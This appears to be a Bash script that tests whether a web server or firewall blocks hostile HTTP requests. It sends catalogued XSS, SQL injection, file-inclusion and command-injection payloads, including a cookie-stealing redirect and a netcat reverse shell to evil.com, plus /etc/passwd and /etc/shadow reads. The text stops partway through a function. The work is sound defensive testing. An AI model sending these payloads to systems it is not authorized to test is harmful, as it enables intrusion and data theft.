#!/bin/bash
#==============================================================================
# HTTP Header Security Testing Suite - EXPANDED VERSION
# Versão: 4.2.0
# Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
#==============================================================================

set -uo pipefail
VERSION="4.2.0"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Variáveis globais
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
VERBOSE=false
OUTPUT_FILE=""
URL=""
UA=""
FILTER="all"  # all, pass, fail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# User-Agents disponíveis
USER_AGENTS=(
    # Desktop - Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    # Desktop - Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0"
    # Desktop - Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"
    # Desktop - Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
    # Mobile - iPhone
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
    # Mobile - Android Chrome
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"
    # Mobile - Android Samsung
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/134.0.0.0 Mobile Safari/537.36"
    # Tablet - iPad
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
    # Desktop - Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/110.0.0.0"
    # Desktop - Brave
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Brave/134"
    # Desktop - Vivaldi
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63"
)

show_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║          HTTP Header Security Testing Suite v${VERSION} - EXPANDED        ║"
    echo "║                     850+ Security Tests Available                         ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

test_curl() {
    local description="$1"
    local expected_behavior="$2"
    shift 2
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    local response
    response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$@" 2>/dev/null)
    # Se curl falhar ou retornar vazio, usar 000
    [[ -z "$response" ]] && response="000"
    
    local status_icon color result_text
    
    if [ "$expected_behavior" == "allow" ]; then
        # Para requests que devem ser PERMITIDOS
        if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
        elif [[ "$response" =~ ^[45] ]] || [ "$response" == "000" ]; then
            color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
        else
            color="${YELLOW}"; status_icon="?"; result_text="WARN"
        fi
    else
        # Para requests que devem ser BLOQUEADOS
        # HTTP 000 = conexão fechada (Nginx 444) = BLOQUEIO BEM SUCEDIDO
        # HTTP 4xx (exceto 404) = BLOQUEIO BEM SUCEDIDO
        # HTTP 200 ou 404 = FALHA (não bloqueou)
        if [ "$response" == "000" ]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS (444)"; PASSED_TESTS=$((PASSED_TESTS + 1))
        elif [ "$response" == "200" ] || [ "$response" == "404" ]; then
            color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
        elif [[ "$response" =~ ^[45] ]]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
        else
            color="${YELLOW}"; status_icon="?"; result_text="WARN"
        fi
    fi
    
    # Aplicar filtro de exibição
    local should_display=true
    if [ "$FILTER" = "pass" ] && [ "$result_text" != "PASS" ]; then
        should_display=false
    elif [ "$FILTER" = "fail" ] && [ "$result_text" != "FAIL" ]; then
        should_display=false
    fi
    
    if [ "$should_display" = true ]; then
        printf "  ${color}[%s]${NC} %-55s ${color}%s${NC} (HTTP %s)\n" "$status_icon" "$description" "$result_text" "$response"
    fi
    [ -n "$OUTPUT_FILE" ] && echo "[${result_text}] ${description} - HTTP ${response}" >> "$OUTPUT_FILE"
}

print_section() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}$1${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TODOS OS MÉTODOS HTTP
#==============================================================================
test_all_http_methods() {
    print_section "📝 TESTES DE TODOS OS MÉTODOS HTTP"
    
    # Métodos padrão que devem funcionar
    print_subsection "Métodos Padrão (devem funcionar)"
    test_curl "GET" "allow" -A "$UA" -Lk -X GET "$URL"
    test_curl "HEAD" "allow" -A "$UA" -Lk -X HEAD "$URL"
    test_curl "POST" "allow" -A "$UA" -Lk -X POST "$URL"
    
    # Métodos que devem ser bloqueados
    print_subsection "Métodos Perigosos (devem ser bloqueados)"
    test_curl "PUT" "block" -A "$UA" -Lk -X PUT "$URL"
    test_curl "DELETE" "block" -A "$UA" -Lk -X DELETE "$URL"
    test_curl "PATCH" "block" -A "$UA" -Lk -X PATCH "$URL"
    test_curl "OPTIONS" "block" -A "$UA" -Lk -X OPTIONS "$URL"
    test_curl "TRACE" "block" -A "$UA" -Lk -X TRACE "$URL"
    test_curl "CONNECT" "block" -A "$UA" -Lk -X CONNECT "$URL"
    
    print_subsection "Métodos WebDAV (devem ser bloqueados)"
    test_curl "PROPFIND" "block" -A "$UA" -Lk -X PROPFIND "$URL"
    test_curl "PROPPATCH" "block" -A "$UA" -Lk -X PROPPATCH "$URL"
    test_curl "MKCOL" "block" -A "$UA" -Lk -X MKCOL "$URL"
    test_curl "COPY" "block" -A "$UA" -Lk -X COPY "$URL"
    test_curl "MOVE" "block" -A "$UA" -Lk -X MOVE "$URL"
    test_curl "LOCK" "block" -A "$UA" -Lk -X LOCK "$URL"
    test_curl "UNLOCK" "block" -A "$UA" -Lk -X UNLOCK "$URL"
    
    print_subsection "Métodos Extensão/Outros (devem ser bloqueados)"
    test_curl "SEARCH" "block" -A "$UA" -Lk -X SEARCH "$URL"
    test_curl "SUBSCRIBE" "block" -A "$UA" -Lk -X SUBSCRIBE "$URL"
    test_curl "UNSUBSCRIBE" "block" -A "$UA" -Lk -X UNSUBSCRIBE "$URL"
    test_curl "NOTIFY" "block" -A "$UA" -Lk -X NOTIFY "$URL"
    test_curl "REPORT" "block" -A "$UA" -Lk -X REPORT "$URL"
    test_curl "MKACTIVITY" "block" -A "$UA" -Lk -X MKACTIVITY "$URL"
    test_curl "CHECKOUT" "block" -A "$UA" -Lk -X CHECKOUT "$URL"
    test_curl "MERGE" "block" -A "$UA" -Lk -X MERGE "$URL"
    test_curl "BASELINE-CONTROL" "block" -A "$UA" -Lk -X BASELINE-CONTROL "$URL"
    test_curl "VERSION-CONTROL" "block" -A "$UA" -Lk -X VERSION-CONTROL "$URL"
    test_curl "ACL" "block" -A "$UA" -Lk -X ACL "$URL"
    test_curl "BIND" "block" -A "$UA" -Lk -X BIND "$URL"
    test_curl "UNBIND" "block" -A "$UA" -Lk -X UNBIND "$URL"
    test_curl "REBIND" "block" -A "$UA" -Lk -X REBIND "$URL"
    
    print_subsection "Métodos Inválidos/Maliciosos"
    test_curl "HACK" "block" -A "$UA" -Lk -X HACK "$URL"
    test_curl "SPAM" "block" -A "$UA" -Lk -X SPAM "$URL"
    test_curl "TEST" "block" -A "$UA" -Lk -X TEST "$URL"
    test_curl "DEBUG" "block" -A "$UA" -Lk -X DEBUG "$URL"
    test_curl "TRACK" "block" -A "$UA" -Lk -X TRACK "$URL"
}

#==============================================================================
# COOKIES MALICIOSOS - 10 DE CADA TIPO
#==============================================================================
test_malicious_cookies() {
    print_section "🍪 TESTES DE COOKIES MALICIOSOS (40 testes)"
    
    print_subsection "XSS via Cookie (10 variações)"
    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk --cookie "x=<script>alert(1)</script>" "$URL"
    test_curl "XSS: <img src=x onerror=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<img src=x onerror=alert(1)>" "$URL"
    test_curl "XSS: <svg onload=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<svg onload=alert(1)>" "$URL"
    test_curl "XSS: <body onload=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<body onload=alert(1)>" "$URL"
    test_curl "XSS: <iframe src=javascript:alert(1)>" "block" -A "$UA" -Lk --cookie "x=<iframe src=javascript:alert(1)>" "$URL"
    test_curl "XSS: javascript:alert(1)" "block" -A "$UA" -Lk --cookie "x=javascript:alert(1)" "$URL"
    test_curl "XSS: <div onmouseover=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<div onmouseover=alert(1)>" "$URL"
    test_curl "XSS: URL encoded" "block" -A "$UA" -Lk --cookie "x=%3Cscript%3Ealert(1)%3C%2Fscript%3E" "$URL"
    test_curl "XSS: Double URL encoded" "block" -A "$UA" -Lk --cookie "x=%253Cscript%253Ealert(1)%253C%252Fscript%253E" "$URL"
    test_curl "XSS: Unicode encoded" "block" -A "$UA" -Lk --cookie "x=\\u003Cscript\\u003Ealert(1)" "$URL"

    print_subsection "SQL Injection via Cookie (10 variações)"
    test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk --cookie "id=' OR '1'='1" "$URL"
    test_curl "SQLi: 1 OR 1=1--" "block" -A "$UA" -Lk --cookie "id=1 OR 1=1--" "$URL"
    test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk --cookie "id=1 UNION SELECT * FROM users" "$URL"
    test_curl "SQLi: DROP TABLE" "block" -A "$UA" -Lk --cookie "id=1;DROP TABLE users;--" "$URL"
    test_curl "SQLi: INSERT INTO" "block" -A "$UA" -Lk --cookie "id=1;INSERT INTO users VALUES(1,'admin')--" "$URL"
    test_curl "SQLi: UPDATE SET" "block" -A "$UA" -Lk --cookie "id=1;UPDATE users SET admin=1--" "$URL"
    test_curl "SQLi: DELETE FROM" "block" -A "$UA" -Lk --cookie "id=1;DELETE FROM users--" "$URL"
    test_curl "SQLi: SLEEP(5)" "block" -A "$UA" -Lk --cookie "id=1 AND SLEEP(5)--" "$URL"
    test_curl "SQLi: BENCHMARK" "block" -A "$UA" -Lk --cookie "id=1 AND BENCHMARK(10000000,SHA1('test'))--" "$URL"
    test_curl "SQLi: WAITFOR DELAY" "block" -A "$UA" -Lk --cookie "id=1;WAITFOR DELAY '0:0:5'--" "$URL"

    print_subsection "Cookie Overflow (10 variações)"
    test_curl "Overflow: 1KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 1024 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 2KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 2048 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 4KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 4096 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 8KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 8192 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 16KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 16384 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 50 cookies pequenos" "block" -A "$UA" -Lk --cookie "$(for i in {1..50}; do echo -n "c$i=value$i;"; done)" "$URL"
    test_curl "Overflow: 100 cookies pequenos" "block" -A "$UA" -Lk --cookie "$(for i in {1..100}; do echo -n "c$i=v;"; done)" "$URL"
    test_curl "Overflow: Nome longo" "block" -A "$UA" -Lk --cookie "$(head -c 500 /dev/zero | tr '\0' 'A')=value" "$URL"
    test_curl "Overflow: Muitos =" "block" -A "$UA" -Lk --cookie "x=$(head -c 500 /dev/zero | tr '\0' '=')" "$URL"
    test_curl "Overflow: Muitos ;" "block" -A "$UA" -Lk --cookie "x=$(head -c 500 /dev/zero | tr '\0' ';')" "$URL"

    print_subsection "Encoding Attacks via Cookie (10 variações)"
    test_curl "Encoding: Null byte" "block" -A "$UA" -Lk --cookie "x=admin%00" "$URL"
    test_curl "Encoding: CRLF injection" "block" -A "$UA" -Lk --cookie $'x=test\r\nSet-Cookie: hacked=true' "$URL"
    test_curl "Encoding: Tab injection" "block" -A "$UA" -Lk --cookie $'x=test\tadmin' "$URL"
    test_curl "Encoding: Backspace" "block" -A "$UA" -Lk --cookie "x=admin%08%08%08guest" "$URL"
    test_curl "Encoding: UTF-7" "block" -A "$UA" -Lk --cookie "x=+ADw-script+AD4-alert(1)+ADw-/script+AD4-" "$URL"
    test_curl "Encoding: Hex encoded" "block" -A "$UA" -Lk --cookie "x=\x3cscript\x3ealert(1)\x3c/script\x3e" "$URL"
    test_curl "Encoding: Octal" "block" -A "$UA" -Lk --cookie "x=\\074script\\076alert\\050\\061\\051" "$URL"
    test_curl "Encoding: HTML entities" "block" -A "$UA" -Lk --cookie "x=&lt;script&gt;alert(1)&lt;/script&gt;" "$URL"
    test_curl "Encoding: Unicode bypass" "block" -A "$UA" -Lk --cookie "x=＜script＞alert(1)＜/script＞" "$URL"
    test_curl "Encoding: Mixed encoding" "block" -A "$UA" -Lk --cookie "x=%3c%53%43%52%49%50%54%3ealert(1)" "$URL"
}

#==============================================================================
# QUERY STRING MALICIOSA - 10 DE CADA TIPO
#==============================================================================
test_malicious_query() {
    print_section "🔍 TESTES DE QUERY STRING MALICIOSA (50 testes)"
    
    print_subsection "SQL Injection (10 variações)"
    test_curl "SQLi: OR 1=1" "block" -A "$UA" -Lk "${URL}?id=1%20OR%201=1"
    test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk "${URL}?id=%27%20OR%20%271%27=%271"
    test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20*%20FROM%20users"
    test_curl "SQLi: DROP TABLE" "block" -A "$UA" -Lk "${URL}?id=1;DROP%20TABLE%20users;--"
    test_curl "SQLi: SLEEP()" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20SLEEP(5)"
    test_curl "SQLi: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1;WAITFOR%20DELAY%20%270:0:5%27"
    test_curl "SQLi: LOAD_FILE()" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20LOAD_FILE(%27/etc/passwd%27)"
    test_curl "SQLi: INTO OUTFILE" "block" -A "$UA" -Lk "${URL}?id=1%20INTO%20OUTFILE%20%27/tmp/test.txt%27"
    test_curl "SQLi: INFORMATION_SCHEMA" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES"
    test_curl "SQLi: Blind boolean" "block" -A "$UA" -Lk "${URL}?id=1%20AND%201=1%20AND%20%27a%27=%27a"

    print_subsection "XSS Reflected (10 variações)"
    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(1)</script>"
    test_curl "XSS: <img onerror>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20onerror=alert(1)>"
    test_curl "XSS: <svg onload>" "block" -A "$UA" -Lk "${URL}?q=<svg%20onload=alert(1)>"
    test_curl "XSS: javascript:" "block" -A "$UA" -Lk "${URL}?url=javascript:alert(1)"
    test_curl "XSS: data:text/html" "block" -A "$UA" -Lk "${URL}?url=data:text/html,<script>alert(1)</script>"
    test_curl "XSS: <body onload>" "block" -A "$UA" -Lk "${URL}?q=<body%20onload=alert(1)>"
    test_curl "XSS: <iframe src>" "block" -A "$UA" -Lk "${URL}?q=<iframe%20src=javascript:alert(1)>"
    test_curl "XSS: <input onfocus>" "block" -A "$UA" -Lk "${URL}?q=<input%20onfocus=alert(1)%20autofocus>"
    test_curl "XSS: <details ontoggle>" "block" -A "$UA" -Lk "${URL}?q=<details%20open%20ontoggle=alert(1)>"
    test_curl "XSS: DOM based" "block" -A "$UA" -Lk "${URL}?q=<script>document.location='http://evil.com/?c='+document.cookie</script>"

    print_subsection "LFI - Local File Inclusion (10 variações)"
    test_curl "LFI: ../etc/passwd" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd"
    test_curl "LFI: Com null byte" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd%00"
    test_curl "LFI: ....// bypass" "block" -A "$UA" -Lk "${URL}?file=....//....//....//etc/passwd"
    test_curl "LFI: ..%252f encoded" "block" -A "$UA" -Lk "${URL}?file=..%252f..%252f..%252fetc/passwd"
    test_curl "LFI: /proc/self/environ" "block" -A "$UA" -Lk "${URL}?file=/proc/self/environ"
    test_curl "LFI: /var/log/apache" "block" -A "$UA" -Lk "${URL}?file=/var/log/apache2/access.log"
    test_curl "LFI: php://filter" "block" -A "$UA" -Lk "${URL}?file=php://filter/convert.base64-encode/resource=index.php"
    test_curl "LFI: expect://" "block" -A "$UA" -Lk "${URL}?file=expect://id"
    test_curl "LFI: Windows path" "block" -A "$UA" -Lk "${URL}?file=C:\\windows\\system32\\drivers\\etc\\hosts"
    test_curl "LFI: /etc/shadow" "block" -A "$UA" -Lk "${URL}?file=../../../etc/shadow"

    print_subsection "RFI - Remote File Inclusion (10 variações)"
    test_curl "RFI: http://evil.com/shell.txt" "block" -A "$UA" -Lk "${URL}?file=http://evil.com/shell.txt"
    test_curl "RFI: https://evil.com/shell.php" "block" -A "$UA" -Lk "${URL}?file=https://evil.com/shell.php"
    test_curl "RFI: ftp://evil.com/shell" "block" -A "$UA" -Lk "${URL}?file=ftp://evil.com/shell.txt"
    test_curl "RFI: http://127.0.0.1" "block" -A "$UA" -Lk "${URL}?file=http://127.0.0.1/shell.php"
    test_curl "RFI: http://localhost" "block" -A "$UA" -Lk "${URL}?file=http://localhost/shell.php"
    test_curl "RFI: URL encoded" "block" -A "$UA" -Lk "${URL}?file=http%3A%2F%2Fevil.com%2Fshell.txt"
    test_curl "RFI: Double encoded" "block" -A "$UA" -Lk "${URL}?file=http%253A%252F%252Fevil.com%252Fshell.txt"
    test_curl "RFI: With null byte" "block" -A "$UA" -Lk "${URL}?file=http://evil.com/shell.txt%00"
    test_curl "RFI: data:// protocol" "block" -A "$UA" -Lk "${URL}?file=data://text/plain,<?php%20system('id');?>"
    test_curl "RFI: php://input" "block" -A "$UA" -Lk "${URL}?file=php://input"

    print_subsection "Command Injection (10 variações)"
    test_curl "CMDi: ; id" "block" -A "$UA" -Lk "${URL}?cmd=test;id"
    test_curl "CMDi: | id" "block" -A "$UA" -Lk "${URL}?cmd=test|id"
    test_curl "CMDi: || id" "block" -A "$UA" -Lk "${URL}?cmd=test||id"
    test_curl "CMDi: && id" "block" -A "$UA" -Lk "${URL}?cmd=test%26%26id"
    test_curl "CMDi: \`id\`" "block" -A "$UA" -Lk "${URL}?cmd=test\`id\`"
    test_curl "CMDi: \$(id)" "block" -A "$UA" -Lk "${URL}?cmd=test\$(id)"
    test_curl "CMDi: cat /etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=cat%20/etc/passwd"
    test_curl "CMDi: wget evil.com" "block" -A "$UA" -Lk "${URL}?cmd=wget%20http://evil.com/shell.sh"
    test_curl "CMDi: curl evil.com" "block" -A "$UA" -Lk "${URL}?cmd=curl%20http://evil.com/shell.sh"
    test_curl "CMDi: nc reverse shell" "block" -A "$UA" -Lk "${URL}?cmd=nc%20-e%20/bin/sh%20evil.com%204444"
}

#==============================================================================
# USER-AGENTS MALICIOSOS DA LISTA
#==============================================================================
test_bad_user_agents() {
    print_section "🤖 TESTES DE USER-AGENTS MALICIOSOS (100 da lista)"
    
    local list_file="${SCRIPT_DIR}/lists/bad-user-agents.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ua_bad || [ -n "$ua_bad" ]; do
        [ -z "$ua_bad" ] && continue
        [ "${ua_bad:0:1}" == "#" ] && continue
        count=$((count + 1))
        test_curl "Bad UA #$count: ${ua_bad:0:40}..." "block" -Lk -A "$ua_bad" "$URL"
        [ $count -ge 100 ] && break
    done < "$list_file"
}

#==============================================================================
# REFERERS SPAM (Tráfego falso, gambling, adulto)
#==============================================================================
test_referers_spam() {
    print_section "📧 TESTES DE REFERERS SPAM (Tráfego falso, gambling, adulto)"
    
    local list_file="${SCRIPT_DIR}/lists/referers-spam.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ref || [ -n "$ref" ]; do
        [ -z "$ref" ] && continue
        [ "${ref:0:1}" == "#" ] && continue
        count=$((count + 1))
        test_curl "SPAM Referer #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
    done < "$list_file"
    
    echo -e "\n  ${CYAN}Total SPAM referers testados: $count${NC}"
}

#==============================================================================
# REFERERS SEO BLACK HAT (Manipulação de rankings)
#==============================================================================
test_referers_seo_blackhat() {
    print_section "🎩 TESTES DE REFERERS SEO BLACK HAT (Manipulação de rankings)"
    
    local list_file="${SCRIPT_DIR}/lists/referers-seo-blackhat.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ref || [ -n "$ref" ]; do
        [ -z "$ref" ] && continue
        [ "${ref:0:1}" == "#" ] && continue
        count=$((count + 1))
        test_curl "SEO BlackHat #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
    done < "$list_file"
    
    echo -e "\n  ${CYAN}Total SEO Black Hat referers testados: $count${NC}"
}

#==============================================================================
# REFERERS INJECTION (Bots falsos, XSS, SQLi, CMDi via referer)
#==============================================================================
test_referers_injection() {
    print_section "💉 TESTES DE REFERERS INJECTION (Bots falsos e payloads)"
    
    local list_file="${SCRIPT_DIR}/lists/referers-injection.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ref || [ -n "$ref" ]; do
        [ -z "$ref" ] && continue
        [ "${ref:0:1}" == "#" ] && continue
        count=$((count + 1))
        # Para injection, alguns são URLs completas, outros são payloads
        if [[ "$ref" == http* ]] || [[ "$ref" == javascript:* ]] || [[ "$ref" == data:* ]] || [[ "$ref" == file:* ]] || [[ "$ref" == ftp:* ]]; then
            test_curl "Injection Referer #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "$ref" "$URL"
        else
            test_curl "Injection Referer #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
        fi
    done < "$list_file"
    
    echo -e "\n  ${CYAN}Total Injection referers testados: $count${NC}"
}

#==============================================================================
# WRAPPER: TODOS OS REFERERS MALICIOSOS
#==============================================================================
test_bad_referers() {
    test_referers_spam
    test_referers_seo_blackhat
    test_referers_injection
}

#==============================================================================
# BOTS LEGÍTIMOS
#==============================================================================
test_good_bots() {
    print_section "✅ TESTES DE BOTS LEGÍTIMOS (devem passar)"
    
    test_curl "Googlebot Mobile" "allow" -Lk -A "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X) AppleWebKit/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "Googlebot Desktop" "allow" -Lk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "Bingbot" "allow" -Lk -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
    test_curl "DuckDuckBot" "allow" -Lk -A "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" "$URL"
    test_curl "Facebot" "allow" -Lk -A "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "$URL"
    test_curl "Twitterbot" "allow" -Lk -A "Twitterbot/1.0" "$URL"
    test_curl "LinkedInBot" "allow" -Lk -A "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)" "$URL"
    test_curl "Slackbot" "allow" -Lk -A "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" "$URL"
    test_curl "WhatsApp" "allow" -Lk -A "WhatsApp/2.23.20.0" "$URL"
    test_curl "Telegrambot" "allow" -Lk -A "TelegramBot (like TwitterBot)" "$URL"
}

#==============================================================================
# FAKE BOTS - Bots que se passam por Google/Bing (devem ser BLOQUEADOS)
#==============================================================================
test_fake_bots() {
    print_section "🎭 TESTES DE FAKE BOTS (Impostores - devem ser BLOQUEADOS)"
    
    echo -e "  ${YELLOW}ℹ️  Estes são bots FALSOS que tentam se passar por crawlers legítimos${NC}"
    echo -e "  ${YELLOW}   Servidores bem configurados devem verificar o IP de origem e bloquear${NC}"
    echo ""
    
    # Fake Googlebot - usando User-Agent real mas de IP não autorizado
    test_curl "FAKE Googlebot Mobile" "block" -Lk -A "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "FAKE Googlebot Desktop" "block" -Lk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "FAKE Googlebot-Image" "block" -Lk -A "Googlebot-Image/1.0" "$URL"
    test_curl "FAKE Googlebot-News" "block" -Lk -A "Googlebot-News" "$URL"
    test_curl "FAKE Googlebot-Video" "block" -Lk -A "Googlebot-Video/1.0" "$URL"
    
    # Fake Bingbot
    test_curl "FAKE Bingbot" "block" -Lk -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
    test_curl "FAKE Bingbot Mobile" "block" -Lk -A "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
    test_curl "FAKE MSNBot" "block" -Lk -A "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "$URL"
    
    # Fake outros bots famosos
    test_curl "FAKE YandexBot" "block" -Lk -A "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "$URL"
    test_curl "FAKE Baiduspider" "block" -Lk -A "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "$URL"
}

#==============================================================================
# HOSTS INVÁLIDOS (10 testes)
#==============================================================================
test_invalid_host() {
    print_section "🏠 TESTES DE HOST INVÁLIDO"
    
    test_curl "Host: 127.0.0.1" "block" -A "$UA" -Lk -H "Host: 127.0.0.1" "$URL"
    test_curl "Host: localhost" "block" -A "$UA" -Lk -H "Host: localhost" "$URL"
    test_curl "Host: vazio" "block" -A "$UA" -Lk -H "Host: " "$URL"
    test_curl "Host: [::1] (IPv6)" "block" -A "$UA" -Lk -H "Host: [::1]" "$URL"
    test_curl "Host: 0.0.0.0" "block" -A "$UA" -Lk -H "Host: 0.0.0.0" "$URL"
    test_curl "Host: 169.254.169.254 (AWS)" "block" -A "$UA" -Lk -H "Host: 169.254.169.254" "$URL"
    test_curl "Host: evil.com" "block" -A "$UA" -Lk -H "Host: evil.com" "$URL"
    test_curl "Host: interno.local" "block" -A "$UA" -Lk -H "Host: interno.local" "$URL"
    test_curl "Host: 10.0.0.1" "block" -A "$UA" -Lk -H "Host: 10.0.0.1" "$URL"
